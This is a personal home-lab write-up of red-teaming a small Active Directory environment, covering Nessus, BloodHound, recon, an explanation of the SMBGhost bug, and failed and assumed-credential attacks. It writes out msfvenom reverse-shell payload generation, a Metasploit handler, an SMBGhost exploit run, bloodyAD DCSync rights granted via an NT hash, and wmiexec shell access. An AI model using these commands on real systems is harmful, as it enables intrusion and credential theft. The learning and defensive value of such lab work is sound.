# Red-Teaming

### Downloading Nessus&#x20;

Before actually red-teaming it, I would need to run some scans ideally.  Hence, first things we'll do is to run Nessus.

{% hint style="info" %}
Nessus is a widely used vulnerability scanner developed by Tenable that checks systems, networks, applications, and cloud environments for security flaws, missing patches, and misconfigurations
{% endhint %}

<img src="../.gitbook/assets/Pasted image 2026-11-25 17.28.33.png" alt="" height="113" width="624">

<img src="../.gitbook/assets/Pasted image 2026-11-25 17.28.34.png" alt="" height="469" width="624">

<img src="../.gitbook/assets/Pasted image 2026-11-25 17.28.35.png" alt="" height="310" width="403">

<img src="../.gitbook/assets/Pasted image 2026-11-25 17.28.36.png" alt="" height="390" width="403">

<img src="../.gitbook/assets/Pasted image 2026-11-25 17.28.37.png" alt="" height="396" width="624">

There was too little room so I moved the Nessus scan to a 100 GB mount:

{% code overflow="wrap" %}
```
sudo systemctl stop nessusd
sudo mv /opt/nessus/var/nessus /mnt/data/nessus-data
sudo ln -s /mnt/data/nessus-data /opt/nessus/var/nessus
sudo systemctl start nessusd
df -h /
```
{% endcode %}

Setting a scan for specific IP targets. We can do an entire subnet if we wanted to, but that would take much longer to perform.

<img src="../.gitbook/assets/Pasted image 2026-11-25 17.28.38.png" alt="" height="297" width="624">

<img src="../.gitbook/assets/Pasted image 2026-11-25 17.28.39.png" alt="" height="389" width="624">

<img src="../.gitbook/assets/Pasted image 2026-11-25 17.28.40.png" alt="" height="227" width="624">

We didn't find any vulnerabilities at all..

### Running Sharphound on Windows&#x20;

Sharphound isn't really a scanner, and you actually need domain credentials to even run it. However, I'm running it advance just to see things&#x20;

{% hint style="info" %}
SharpHound is the official C# data collector for BloodHound, used to gather Active Directory objects, permissions, group memberships, and session data to map privilege and attack paths.
{% endhint %}

<img src="../.gitbook/assets/Pasted image 2026-11-25 17.28.40 (1).png" alt="" height="455" width="624">

<img src="../.gitbook/assets/Pasted image 2026-11-25 17.28.41.png" alt="" height="171" width="624">

<img src="../.gitbook/assets/Pasted image 2026-11-25 17.28.42.png" alt="" height="508" width="624">

Now we have the zip, we can probably just host it on a python http server - we will now create our Kali VM

<img src="../.gitbook/assets/Pasted image 2026-11-25 17.28.44.png" alt="" height="179" width="624">

<img src="../.gitbook/assets/Pasted image 2026-11-25 17.28.45.png" alt="" height="367" width="624">

<img src="../.gitbook/assets/Pasted image 2026-11-25 17.28.46.png" alt="" height="305" width="521">

After that I just updated and ran Bloodhound&#x20;

<img src="../.gitbook/assets/Pasted image 2026-11-25 17.28.50.png" alt="" height="172" width="624">

### Verify Logs Coming in&#x20;

<img src="../.gitbook/assets/Pasted image 2026-11-25 17.28.57.png" alt="" height="437" width="624">

\
Seems about right! We can then move on to red-teaming our environment.&#x20;

### Red Teaming - Recon

Essentially our environment (or at least mine), is one AD DC, one Domain Join Computer, and One Linux Server hosting a lot of SIEM stuff. This means looking and just scanning at most of the computers to see if I can get their credentials.

There were no nessus vulnerabilities I could rely on. I could do a nmap scan that would scan the entire subnet, but for sake of time, let's say I already know there were 3 IPs and their role within the network infra. The first thing I did was to scan the 3 IPs.&#x20;

192.168.1.119 (Linux)

<img src="../.gitbook/assets/Pasted image 2026-11-25 17.36.35.png" alt="" height="248" width="397">

<br>

First with the Linux Server, it has port TCP open (22), and port 9200 open which is an elastic search API. It has a hostname of linux-server-simon, and some SSL issues. I would save exploiting this for later if I can’t crack into the other Window Machines.

192.168.1.12 (AD DC)

<img src="../.gitbook/assets/Pasted image 2026-11-25 17.36.36.png" alt="" height="351" width="525">

Luckily there’s a lot of vectors we can use for this AD DC. It has a hostname of SIMON-DC-RW. We can tell it's an AD DC from the kerberos and LDAP.

192.168.1.111 (Domain-Joined Window Host)

<img src="../.gitbook/assets/Pasted image 2026-11-25 17.36.37.png" alt="" height="202" width="512">

There’s honestly not much here so hopefully we can just rely on the AD DC.

What I'm going to do now is just do a lot of unauth commands. I'm not going to explain each one, but if you are interested in knowing them I recommend reading my HTB write ups!&#x20;

<img src="../.gitbook/assets/Pasted image 2026-11-25 17.54.53.png" alt="" height="147" width="268">

<img src="../.gitbook/assets/Pasted image 2026-11-25 17.54.53 (1).png" alt="" height="140" width="530">

<img src="../.gitbook/assets/Pasted image 2026-11-25 17.54.55.png" alt="" height="133" width="513">

<img src="../.gitbook/assets/Pasted image 2026-11-25 17.54.56.png" alt="" height="203" width="428">

<img src="../.gitbook/assets/Pasted image 2026-11-25 17.54.58.png" alt="" height="170" width="511">

I then ran a master script that would check the server:

<img src="../.gitbook/assets/Pasted image 2026-11-25 17.56.18.png" alt="" height="198" width="525">

There’s LDAP signing not enforced on the AD DC, which could lead to using a responder or some relay attack. But  I already know the password isn’t crackable because I did some goofy password. (So no responder or NTLM hashes)&#x20;

From the script, we can see that SMBGhost is vulnerable. Let’s test it out.&#x20;

<img src="../.gitbook/assets/Pasted image 2026-11-25 17.56.19.png" alt="" height="142" width="540">

<img src="../.gitbook/assets/Pasted image 2026-11-25 17.57.28.png" alt="" height="261" width="429">

### What is SMBGhost? (CVE-2020-0796) 10.0&#x20;

CVE-2020-0796 is a bug in the compression mechanism of SMBv3.1.1, also known as “SMBGhost”. The bug affects Windows 10 versions 1903 and 1909. It’s basically an unauthenticated RCE which is great since we don’t have credentials!&#x20;

The vulnerability exists in the Windows SMB kernel driver (srv2.sys) handling compressed data packets. An overflow occurs when parsing the length and offset values of a compressed SMBv3 packet. Specifically, the attacker crafts a special header for “OriginalCompressedSegmentSize” where the offset values are changed. So when the system attempts to decompress the payload, it overflows the memory and essentially runs code.

Further Explanation:&#x20;

When a compressed SMB packet arrives, the driver reads two values from the header to figure out how much memory it needs to allocate:

• OriginalCompressedSegmentSize (The size of the uncompressed data)

• Offset (Where the compressed data starts)

It then uses some formula to calculate how much memory to allocate (it just adds the two). It holds a fixed 32 bit number (like 0xFFFFFFFF).  An overflow condition happens when a math operation produces a number that is larger than the variable's maximum capacity - because the computer runs out of bits to represent the number, the extra bits are dropped, and it wraps around. So if the attacker can figure out what numbers to send, it can make the computer only allocate 0 memory. Then, the attacker intentionally crafts the overflow so that the function pointer is replaced with a custom memory address, with their shellcode.&#x20;

### Initial Access/Exploitation  (Attempt)

{% code overflow="wrap" %}
```
git clone https://github.com/chompie1337/SMBGhost_RCE_PoC
cd SMBGhost_RCE_PoC

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<kali-ip> LPORT=4444 -f py -o sc.py

msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST <YOUR-KALI-IP>; set LPORT 4444; run"

python3 exploit.py -ip 192.168.1.12
```
{% endcode %}

<img src="../.gitbook/assets/Pasted image 2026-11-25 17.59.17.png" alt="" height="275" width="624">

Running this did not work for some reason, so I tried to use Metasploit.

<img src="../.gitbook/assets/Pasted image 2026-11-25 17.59.29.png" alt="" height="213" width="624">

This wasn't working, so I tried researching more until I found out:&#x20;

<img src="../.gitbook/assets/Pasted image 2026-11-25 18.00.09.png" alt="" height="512" width="624">

So I then checked it… apparently I forgot that I used the most patched version of Windows Server. This meant that most CVEs and popular vulnerabilities won’t really work. (CVE-2020-0796 only affects builds 18362 (1903) and 18363 (1909)&#x20;

From testing more, there wasn’t really any more attack since the password is secure, the server is patched/not legacy, and I can’t really relay since all of the singing is enabled.&#x20;

So I’m just going to assume credentials to one of the other VMs, the Windows-Join domain.

<img src="../.gitbook/assets/Pasted image 2026-11-25 18.00.40.png" alt="" height="80" width="624">

Our goal with these creds is to get a shell, however we don’t have ssh/winrm/rdp,etc We will use impacket/WMIExec. WMIExec is a tool used to execute commands and gain a semi-interactive shell on a remote Windows system

<img src="../.gitbook/assets/Pasted image 2026-11-25 18.00.56.png" alt="" height="416" width="608">

Running these won’t work because the ports aren’t open.&#x20;

<img src="../.gitbook/assets/Pasted image 2026-11-25 18.00.57.png" alt="" height="140" width="624">

<img src="../.gitbook/assets/Pasted image 2026-11-25 18.00.58.png" alt="" height="377" width="624">

After secret dumping everyone we can do 2 things:

<img src="../.gitbook/assets/Pasted image 2026-11-25 18.01.29.png" alt="" height="120" width="624">

This is essentially the equivalent of dumping secrets without the ntds.dit&#x20;

{% hint style="info" %}
ntds.dit (New Technology Directory Services Directory Information Tree) is the central database file for Microsoft Active Directory Domain Services (AD DS) stored on every Windows Server Domain Controller (typically at C:\Windows\NTDS\ntds.dit).
{% endhint %}

The live NTDS.dit file is locked. While AD DS is running, the database engine holds C:\Windows\NTDS\NTDS.dit open, so a plain copy fails with a sharing violation (“file in use by another process”)

<img src="../.gitbook/assets/Pasted image 2026-11-25 18.01.30.png" alt="" height="172" width="624">

Using bloodhound we can see that we have direct access/admin privileges essentially.&#x20;

What we can do is either just use impacket and dump the credentials directly, or add the DCSync permissions to our group/account.

<img src="../.gitbook/assets/Pasted image 2026-11-25 18.01.31.png" alt="" height="341" width="624">

<img src="../.gitbook/assets/Pasted image 2026-11-25 18.01.32.png" alt="" height="395" width="624">

We can add DCSync permissions via the tool bloodyAD tool:

{% code overflow="wrap" %}
```
bloodyAD --host 192.168.1.12 -d rushhour.local -u Administrator -p :d01ba786897970b3c1bbe2cca275dee7 add dcsync simon

Or: bloodyAD --host 192.168.1.12 -d rushhour.local -u simon -p '1234RJ!' add dcsync simon

export KRB5CCNAME=Administrator.ccache
wmiexec.py -k -no-pass rushhour.local/Administrator@SIMON-DC-RW

```
{% endcode %}

<img src="../.gitbook/assets/Pasted image 2026-11-25 18.01.34.png" alt="" height="159" width="624">

<img src="../.gitbook/assets/Pasted image 2026-11-25 18.01.42.png" alt="" height="165" width="624">

<img src="../.gitbook/assets/Pasted image 2026-11-25 18.01.47.png" alt="" height="152" width="624">

<img src="../.gitbook/assets/Pasted image 2026-11-25 18.01.51.png" alt="" height="220" width="624">

(After several attempts I couldn’t get access to the accounts at all)

Regarding cracking them, it’s just using hashcat -a 0 -m (nt hash type) with the rockyou wordlist. However, I don’t think any of the passwords I put in unfortunately are crackable because they’re goofy. So it seems as of now, its pretty much impossible to hack into our server/domain if we purely relying on vulnerabilities. &#x20;
